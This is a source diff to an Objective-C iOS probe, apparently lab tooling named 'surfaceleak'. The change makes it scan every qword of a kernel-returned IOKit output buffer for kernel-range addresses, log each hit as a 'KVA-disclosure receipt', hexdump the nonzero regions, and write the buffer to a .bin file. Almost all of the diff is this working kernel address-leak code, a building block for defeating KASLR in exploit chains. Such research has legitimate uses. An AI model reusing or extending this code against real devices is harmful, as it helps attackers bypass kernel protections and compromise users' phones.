@@ -32,7 +32,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 
-#define P114_BUILD @"p114-surfaceleak-v1.12-open8"
+#define P114_BUILD @"p114-surfaceleak-v1.13-fullscan"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -86,6 +86,17 @@ static void Lf(NSString *fmt, ...) {
 static BOOL p114_kernelish(uint64_t v) {
     return (v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFFF000000000ULL) ||
            (v >= 0xFFFFFFF000000000ULL);
+}
+
+static void p114_write_bin(NSString *name, const uint8_t *bytes, size_t n) {
+    NSString *docs = [NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    NSString *path = [docs stringByAppendingPathComponent:name];
+    FILE *f = fopen(path.fileSystemRepresentation, "wb");
+    if (!f) return;
+    if (fwrite(bytes, 1, n, f) != n) { /* partial write = whatever landed */ }
+    fclose(f);
+    Lf(@"[v13scan] sidecar -> %@", path);
 }
 
 /* dlsym'd IOKit (P098 local-prototype shape — IOKitLib.h is iOS-safe but
@@ -356,9 +367,66 @@ static void p114_hexdump(size_t maxn) {
             if (mismatch) {
                 caps_held++;
                 Lf(@"[cap %d/%d] OUT SHAPE MISMATCH (tolerant law): kext version "
-                   @"drift / row-size drift — hexdump follows, capture HELD "
-                   @"(nothing parsed from an unmatched shape)",
+                   @"drift / row-size drift — FULL-BUFFER SCAN (v1.13: the 17's "
+                   @"2bf+64KB class = the payload lives deeper than 0x80; the "
+                   @"KVA-disclosure receipt = the kernel-range census over the "
+                   @"WHOLE buffer, not the header)",
                    c + 1, P114_CAPTURES);
+                /* v1.13 FULL-BUFFER KVA CENSUS (the mismatch class used to
+                   stop at 0x80 — the 17's 2bf+65536 shape hides the records
+                   deeper). Scan every qword for the kernel-range law; the
+                   nonzero runs + the KV census + the sidecar = the receipt
+                   path. READ-ONLY. */
+                {
+                    uint64_t kv = 0, nz = 0, first_kv_off = (uint64_t)-1;
+                    static uint64_t kv_vals[16]; uint32_t kvn = 0;
+                    static uint64_t kv_offs[16];
+                    for (size_t o = 0; o < outLen; o += 8) {
+                        uint64_t v;
+                        memcpy(&v, g_p114_out + o, 8);
+                        if (v != 0) {
+                            nz++;
+                            if (nz <= 6 && kvn < 16) { /* sample the first nonzeros' offsets too */ }
+                        }
+                        if (p114_kernelish(v)) {
+                            kv++;
+                            if (kvn < 16) { kv_vals[kvn] = v; kv_offs[kvn] = o; kvn++; }
+                            if (first_kv_off == (uint64_t)-1) first_kv_off = o;
+                        }
+                    }
+                    Lf(@"[v13scan] bytes=%zu nonzero_q=%llu kernel_range_q=%llu",
+                       outLen, (unsigned long long)nz, (unsigned long long)kv);
+                    for (uint32_t i = 0; i < kvn; i++)
+                        Lf(@"[v13scan] KERNEL KV @+0x%04zx = 0x%016llx",
+                           kv_offs[i], kv_vals[i]);
+                    if (first_kv_off != (uint64_t)-1) {
+                        Lf(@"[*** v13scan] KVA-DISCLOSURE RECEIPT CLASS — the "
+                           @"kernel-range qwords live in the HELD buffer; "
+                           @"sidecar written; KV=%llu ***", kv);
+                        p114_write_bin(@"p114_2bf_full.bin", g_p114_out, outLen);
+                    }
+                    if (nz) {
+                        /* the nonzero regions = the hexdump of the FIRST
+                           0x100 nonzero span for the shape map */
+                        size_t nzoff = 0;
+                        for (size_t o = 0; o < outLen; o += 8) {
+                            uint64_t v; memcpy(&v, g_p114_out + o, 8);
+                            if (v != 0) { nzoff = o; break; }
+                        }
+                        if (nzoff + 0x100 <= outLen) {
+                            static uint8_t saveP114out[sizeof(g_p114_out)];
+                            memcpy(saveP114out, g_p114_out, sizeof(saveP114out));
+                            /* reuse hexdump? it reads g_p114_out at fixed offsets —
+                               instead dump the slice directly: */
+                            for (size_t r = 0; r < 0x100; r += 16) {
+                                NSMutableString *hx = [NSMutableString string];
+                                for (size_t q = 0; q < 16; q++)
+                                    [hx appendFormat:@"%02x", saveP114out[nzoff + r + q]];
+                                Lf(@"[v13scan] +0x%04zx: %@", nzoff + r, hx);
+                            }
+                        }
+                    }
+                }
                 p114_hexdump(0x80);
                 continue;
             }
